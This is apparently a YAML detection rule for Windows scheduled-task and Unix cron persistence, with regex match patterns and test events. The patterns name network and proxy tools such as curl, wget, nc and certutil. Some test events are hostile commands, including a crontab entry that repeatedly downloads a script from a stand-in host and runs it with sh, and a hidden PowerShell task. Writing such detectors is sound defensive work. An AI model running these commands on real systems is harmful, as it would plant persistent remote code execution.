- id: TB-PERSIST-002
  name: Scheduled task or cron persistence
  severity: medium
  confidence: 65
  techniques: [T1053.005, T1053.003]
  tags: [persistence, scheduled-task]
  match:
    any:
      # a task whose action is an interpreter / signed-binary proxy / user-writable location, or one that runs at every logon/boot
      - {field: command_line, regex: 'schtasks(\.exe)?\s.{0,200}/create\b.{0,300}/tr\s+"?[^/]{0,200}?(powershell|pwsh|cmd(\.exe)?"?\s+/c|wscript|cscript|mshta|rundll32|regsvr32|msbuild|curl|bitsadmin|certutil|https?:|\\appdata\\|\\temp\\|\\users\\public\\|\\programdata\\|%temp%|%appdata%|\.ps1|\.vbs|\.hta|\.js\b)'}
      - all:
          - {field: command_line, regex: 'schtasks(\.exe)?\s.{0,200}/create\b.{0,300}/sc\s+(onlogon|onstart|onidle)'}
          - not: {field: command_line, regex: '(program files|\\windows\\system32|%programfiles%|%systemroot%)'}
      - {field: command_line, regex: '(\|\s{0,3}crontab\s+-\s*$|crontab\s+(/tmp/|/dev/shm/|/var/tmp/|\.{1,2}/|/home/\S{0,40}/\.)|echo\s.{0,200}>>?\s*/(etc/cron|var/spool/cron))'}
      - {field: command_line, regex: '\(crontab\s+-l.{0,20};\s*echo'}
      - {field: command_line, regex: '(@reboot|\*/\d{1,2}\s\*\s\*\s\*\s\*).{0,100}(curl|wget|nc|bash|python|/tmp/)'}
      - {field: command_line, regex: 'register-scheduledtask|new-scheduledtask(action|trigger)'}
      - {field: command_line, regex: 'schtasks(\.exe)?\s.{0,200}/create\b.{0,300}(/s\s+\S+|/rp\s+\S+)'}
      - {field: command_line, regex: '\bat(\.exe)?\s+\d{1,2}:\d{2}\s.{0,40}(cmd|powershell|\.exe)'}
  tests:
    - {event: {command_line: 'schtasks /create /tn Updater /tr C:\x.exe /sc onlogon'}, expect_match: true}
    - {name: interpreter action, event: {command_line: 'schtasks /create /tn Upd /tr "powershell -w hidden -f C:\ProgramData\u.ps1" /sc daily'}, expect_match: true}
    - {name: ordinary daily backup task, event: {command_line: 'schtasks /create /tn NightlyBackup /tr "C:\ops\backup.cmd" /sc daily /st 02:00 /ru SYSTEM'}, expect_match: false}
    - {name: crontab file managed by configuration management, event: {command_line: 'crontab /etc/cron.d/puppet-managed'}, expect_match: false}
    - {name: listing crontab, event: {command_line: 'crontab -l'}, expect_match: false}
    - {event: {command_line: '(crontab -l; echo "*/5 * * * * curl -s http://x.example/a|sh") | crontab -'}, expect_match: true}
    - {event: {command_line: 'schtasks /query'}, expect_match: false}

